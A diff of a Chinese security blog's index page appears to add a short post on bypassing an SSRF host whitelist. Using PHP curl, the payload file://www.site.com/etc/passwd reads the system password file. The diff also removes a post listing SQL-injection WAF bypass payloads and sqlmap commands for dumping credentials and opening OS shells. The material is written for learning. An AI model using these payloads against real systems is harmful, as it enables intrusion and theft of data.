@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">117</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,92 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/PHP/File%E5%8D%8F%E8%AE%AE%E5%B0%8Ftrick/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/03/PHP/File%E5%8D%8F%E8%AE%AE%E5%B0%8Ftrick/" class="post-title-link" itemprop="url">File协议小trick</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-03 20:52:54 / 修改时间：20:53:35" itemprop="dateCreated datePublished" datetime="2022-04-03T20:52:54+08:00">2022-04-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>构建test文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">$info = parse_url($url);</span><br><span class="line">//假设www.site.com为白名单网站</span><br><span class="line">if($info[&#x27;host&#x27;] != &#x27;www.site.com&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &#x27;目标网址不合法&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">$data = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
+<p>上面这段代码我们知道，主要是进行网址过滤，如果用户输入的网址不是规定的网址，则服务器不会发起请求。<br>这段代码的目的是，防止用户输入其它恶意数据，造成攻击，比如：</p>
+<p><a target="_blank" rel="noopener" href="http://www.site.com/test.php?url=http://10.0.0.16">http://www.site.com/test.php?url=http://10.0.0.16</a> –攻击者尝试进入内网</p>
+<p><a target="_blank" rel="noopener" href="http://www.site.com/test.php?url=http://www.hack.com">http://www.site.com/test.php?url=http://www.hack.com</a> –攻击者尝试访问不合法网址</p>
+<p>但这里有两个小问题：</p>
+<ol>
+<li>parse_url原理<br>parse_url只是负责字符串解析，它不保证你的协议真伪，这里我们不用http协议，而使用一个根本不存在的协议abc测试：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$url = &#x27;abc://www.baidu.com/test&#x27;;</span><br><span class="line">$info = parse_url($url);</span><br><span class="line">var_dump($info);</span><br></pre></td></tr></table></figure>
+<p>输出结果为：<br>array(3) { [“scheme”]=&gt; string(3) “abc” [“host”]=&gt; string(13) “<a target="_blank" rel="noopener" href="http://www.baidu.com&quot;/">www.baidu.com&quot;</a> [“path”]=&gt; string(11) “/test” }</p>
+<ol start="2">
+<li>curl支持的协议很多</li>
+</ol>
+<p>curl是基于libcurl实现的，支持的协议非常多。</p>
+<p>所以我们可以发现两处问题</p>
+<ol>
+<li>白名单只是检测了host，但没有检测协议</li>
+<li>curl除了支持http协议，还支持file协议<br>这里给出sample</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://url/test.php?url=file://www.site.com/etc/passwd">http://url/test.php?url=file://www.site.com/etc/passwd</a></p>
+<p>phpcurl识别出来这是个file协议，会忽略后面的host <a target="_blank" rel="noopener" href="https://www.site.com,直接去读取文件/etc/passwd">www.site.com</a>，直接去读取文件/etc/passwd</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2120,169 +2206,6 @@ sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试）
 <li>提交参数中存在/禁止的扩展名类型</li>
 <li>前端单独抽出了文件扩展名进行了提交</li>
 </ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">WAF绕过</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-03-20 19:31:17 / 修改时间：19:31:58" itemprop="dateCreated datePublished" datetime="2022-03-20T19:31:17+08:00">2022-03-20</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>掌握mysql函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=绕过WAF防护</p>
-<p>代码实现：</p>
-<p>（部分）</p>
-<p>$id =$_GET[‘id’];</p>
-<p>$id = blacklist($id);</p>
-<p>$sql=’select * from users where id=’$id’ limit 0,1”;</p>
-<p>$result = mysql_query($sql);</p>
-<p>$row = mysql_fetch_array($result);</p>
-<p>function blacklist($id)</p>
-<p>{</p>
-<p>$id = preg_replace(‘/or/i’,’’,$id);</p>
-<p>$id = preg_replace(‘/AND/i’,’’,$id);</p>
-<p>return $id;</p>
-<p>}</p>
-<p>1.分析代码：</p>
-<p>使用了Blacklist函数过滤了’or’和’and’</p>
-<p>2.绕过限制</p>
-<p> 大小写变形：Or OR,oR 等价替换：and = &amp; or = || 双写等</p>
-<p>黑盒绕过：</p>
-<ol>
-<li>架构层绕过：</li>
-</ol>
-<ul>
-<li>寻找源站，针对云WAF</li>
-<li>利用同网段，绕过WAF防护区域</li>
-<li>利用边界漏洞，绕过WAF防护区</li>
-</ul>
-<p> 2.资源限制角度绕过WAF</p>
-<ul>
-<li><pre><code> post大body
-</code></pre>
-</li>
-</ul>
-<p> 3.协议层面绕WAF</p>
-<ul>
-<li>协议未覆盖WAF<br>（请求方式变化：get&gt;post 参数污染）</li>
-</ul>
-<p> 4.规则层面绕过</p>
-<ol>
-<li>sql注释符绕过</li>
-</ol>
-<ul>
-<li>union /**/select</li>
-<li>union/<em>aaa%01bbs</em>/select</li>
-<li>union/<em>aaaaaaaaaaaaaaaaaaaaaa</em>/select</li>
-<li>内联注释:/<em>!xxx</em>/</li>
-</ul>
-<p> 2.空白符绕过</p>
-<ul>
-<li>mysql空白符:%09.%0A.%0B.%0D.%0C.%A0.%20,/<em>xxx</em>/</li>
-<li>正则的空白符：%09.%0A.%0B.%0D.%20<br>exa1:union%250Cselect</li>
-</ul>
-<p>exa2:union%25A0select</p>
-<p> 3.函数分割符号：</p>
-<ul>
-<li> concat%2520(</li>
-<li>concat/**/(</li>
-<li>concat%250c(</li>
-<li>concat%25a0(</li>
-</ul>
-<p> 4.浮点数词法解析</p>
-<ul>
-<li><p>select * from users where id = 8E0union select 1,2,3,4,5,6,7,8,0</p>
-</li>
-<li><p>select * from users where id = 8.0 union select 1,2,3,4,5,6,7,8,0</p>
-</li>
-<li><p>select * from users where id =\N union select 1,2,3,4,5,6,7,8,9,0<br>5.利用error-base进行sql注入：error-based sql注入函数非常容易被忽略</p>
-</li>
-<li><p>extractvalue(1,concat(0x5c,md5(3)));</p>
-</li>
-<li><p>updatexml(1,concat(0x5d,md5(3)),1);</p>
-</li>
-<li><p>GeometryCollection((select * from(select * from(select@@version)f)x))</p>
-</li>
-<li><p>polygon((select * from (select name_const(version(),1))x))</p>
-</li>
-<li><p>linestring()</p>
-</li>
-<li><p>multipoint()</p>
-</li>
-<li><p>multilinestring()</p>
-</li>
-<li><p>multipolygon()</p>
-</li>
-</ul>
-<p> 6.mysql特殊语法</p>
-<ul>
-<li> select{x table_name}from{x information_schema.tables};<br>以注释符绕过为例，采取工具BP进行fuzz注释符内的字符获取payload</li>
-</ul>
-<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="sqlmap常见命令"><a href="#sqlmap常见命令" class="headerlink" title="sqlmap常见命令"></a>sqlmap常见命令</h2><p>sqlmap.py -u ‘url?id=1’</p>
-<p>sqlmap.py -u ‘url?id=1’ – current-db</p>
-<p>sqlmap.py -u ‘url?id=1’ –current-user</p>
-<p>sqlmap.py -u ‘url?id=1’ -D security –tables</p>
-<p>sqlmap.py -u ‘url?id=1’ -D security -T users –columns</p>
-<p>sqlmap.py -u ‘url?id=1’ -D security -T users -C username,password –dump</p>
-<p>sqlmap.py -u ‘url?id=1’ –os-shell</p>
-<p>sqlmap.py -u ‘url?id=1’ –sql-shell</p>
-<p>sqlmap.py -u ‘url?id=1’ –file-read</p>
-<p>sqlmap.py -u ‘url?id=1’ –file-write 本地文件 –file-dest 目标目录及文件</p>
 
       
     </div>
